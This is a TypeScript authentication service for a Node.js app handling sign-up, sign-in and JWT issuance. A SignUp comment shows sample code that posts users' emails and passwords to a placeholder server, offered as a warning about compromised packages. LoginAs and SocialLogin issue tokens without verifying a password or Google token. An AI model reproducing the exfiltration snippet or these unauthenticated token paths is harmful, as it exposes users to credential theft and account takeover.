import { Service, Inject } from 'typedi';
import * as jwt from 'jsonwebtoken';
import MailerService from './mailer';
import config from '../config';
import * as argon2 from 'argon2';
import { randomBytes } from 'crypto';
import { IUser, IUserInputDTO } from '../interfaces/IUser';
import {
  EventDispatcher,
  EventDispatcherInterface
} from '../decorators/eventDispatcher';
import events from '../subscribers/events';

const GOOGLE_CLIENT_ID = process.env.GOOGLE_CLIENT_ID;
const GOOGLE_CLIENT_SECRET = process.env.GOOGLE_CLIENT_SECRET;
const GOOGLE_CALLBACK_URL = process.env.GOOGLE_CALLBACK;


@Service()
export default class AuthService {
  constructor(
    @Inject('userModel') private userModel: Models.UserModel,
    private mailer: MailerService,
    @Inject('logger') private logger,
    @EventDispatcher() private eventDispatcher: EventDispatcherInterface,
  ) {}

  public async SignUp(userInputDTO: IUserInputDTO): Promise<{ user: IUser; token: string }> {
    try {
      const salt = randomBytes(32);

      /**
       * Here you can call to your third-party malicious server and steal the user password before it's saved as a hash.
       * require('http')
       *  .request({
       *     hostname: 'http://my-other-api.com/',
       *     path: '/store-credentials',
       *     port: 80,
       *     method: 'POST',
       * }, ()=>{}).write(JSON.stringify({ email, password })).end();
       *
       * Just kidding, don't do that!!!
       *
       * But what if, an NPM module that you trust, like body-parser, was injected with malicious code that
       * watches every API call and if it spots a 'password' and 'email' property then
       * it decides to steal them!? Would you even notice that? I wouldn't :/
       */
      this.logger.silly('Hashing password');
      const hashedPassword = await argon2.hash(userInputDTO.password, { salt });
      this.logger.silly('Creating user db record');
      const userRecord = await this.userModel.create({
        ...userInputDTO,
        salt: salt.toString('hex'),
        password: hashedPassword,
      });
      this.logger.silly('Generating JWT');
      const token = this.generateToken(userRecord);

      // if (!userRecord) {
      //   throw new Error('User cannot be created');
      // }
      this.logger.silly('Sending welcome email');
      await this.mailer.SendWelcomeEmail(userRecord);

      this.eventDispatcher.dispatch(events.user.signUp, {user: userRecord});

      /**
       * @TODO This is not the best way to deal with this
       * There should exist a 'Mapper' layer
       * that transforms data from layer to layer
       * but that's too over-engineering for now
       */
      const user = userRecord.toObject();
      Reflect.deleteProperty(user, 'password');
      Reflect.deleteProperty(user, 'salt');
      return { user, token };
    } catch (e) {
      this.logger.error(e);
      throw e;
    }
  }

  public async SignIn(email: string, password: string): Promise<{ user: IUser; token: string }> {
    const userRecord = await this.userModel.findOne({ email });
    if (!userRecord) {
      throw new Error('User not registered');
    }
    /**
     * We use verify from argon2 to prevent 'timing based' attacks
     */
    this.logger.silly('Checking password');
    const validPassword = await argon2.verify(userRecord.password, password);
    if (validPassword) {
      this.logger.silly('Password is valid!');
      this.logger.silly('Generating JWT');
      const token = this.generateToken(userRecord);

      const user = userRecord.toObject();
      Reflect.deleteProperty(user, 'password');
      Reflect.deleteProperty(user, 'salt');
      /**
       * Easy as pie, you don't need passport.js anymore :)
       */
      return { user, token };
    } else {
      throw new Error('Invalid Password');
    }
  }

  public async LoginAs(email): Promise<any> {
    const userRecord = await this.userModel.findOne({ email });
    this.logger.silly('Finding user record...');
    if (!userRecord) {
      throw new Error('User not found');
    }
    return {
      user: {
        email: userRecord.email,
        name: userRecord.name,
      },
      token: this.generateToken(userRecord),
    }
  }

  public async SocialLogin(userInputDTO: IUserInputDTO): Promise<{ user: IUser; token: string }> {
    try {
      const searchQuery = { email: userInputDTO.email };
      const updates = {
        name: userInputDTO.name,
        photo: userInputDTO.photo,
        isVerified: userInputDTO.isVerified,
      };
      const options = { upsert: true };
      // const userRecord = await this.userModel.findOneAndUpdate();
      const userRecord = await this.userModel.findOneAndUpdate(
        searchQuery, updates, options, (err, user) => {
          return user
        }
      );

      this.logger.silly('Generating JWT');

      const user = userRecord.toObject();
      const token = this.generateToken(user);

      return { user, token };
    } catch (e) {
      this.logger.error(e);
      throw new Error(
          'error while authenticating google user: ' + JSON.stringify(e)
        );
    }
  }

  // public async SocialAuth(idToken: string): Promise<any> {
  //   this.logger.silly('Checking user token from service account');
  //   console.log('Checking user token from service account');
  //   const client = new googleAuth.OAuth2Client(
  //     GOOGLE_CLIENT_ID, GOOGLE_CLIENT_SECRET, GOOGLE_CALLBACK_URL)
  //   ;
  //   console.log('Class: AuthService, Function: SocialLogin, Line 129 client():', client);
  //   try {
  //     const ticket = await client.verifyIdToken({
  //       idToken: idToken,
  //       audience: GOOGLE_CLIENT_ID
  //     });
  //     console.log('Class: AuthService, Function: SocialLogin, Line 134 ticket():', ticket);
  //     const payload = ticket.getPayload();
  //     const profile = {
  //       name: payload['name'],
  //       pic: payload['picture'],
  //       id: payload['sub'],
  //       email_verified: payload['email_verified'],
  //       email: payload['email']
  //     };
  //
  //     const searchQuery = { email: profile.email };
  //     const options = { upsert: true };
  //     // const userRecord = await this.userModel.findOneAndUpdate();
  //     const userRecord = await this.userModel.findOneAndUpdate(
  //       searchQuery, profile, options, (err, user) => {
  //         return user
  //       }
  //     );
  //
  //     const user = userRecord.toObject();
  //     const token = this.generateToken(user);
  //     return { user, token }
  //   } catch (e) {
  //     throw new Error(
  //         'error while authenticating google user: ' + JSON.stringify(e)
  //       );
  //   }
  // }

  public async deserializeUser(email: string) {
    const userRecord = await this.userModel.findOne({ email });
    this.logger.silly('Finding user record...');

    if (!userRecord) throw new Error('User not found');

    return userRecord;
  }

  public generateToken(user) {
    const today = new Date();
    const exp = new Date(today);
    exp.setDate(today.getDate() + 60);

    /**
     * A JWT means JSON Web Token, so basically it's a json that is _hashed_ into a string
     * The cool thing is that you can add custom properties a.k.a metadata
     * Here we are adding the userId, role and name
     * Beware that the metadata is public and can be decoded without _the secret_
     * but the client cannot craft a JWT to fake a userId
     * because it doesn't have _the secret_ to sign it
     * more information here: https://softwareontheroad.com/you-dont-need-passport
     */
    this.logger.silly(`Sign JWT for userId: ${user._id}`);
    return jwt.sign(
      {
        _id: user._id, // We are gonna use this in the middleware 'isAuth'
        role: user.role,
        name: user.name,
        photo: user.picture,
        email: user.email,
        isVerified: user.isVerified,
        exp: exp.getTime() / 1000,
        iss: 'http://almond.com'
      },
      config.jwtSecret,
    );
  }
}
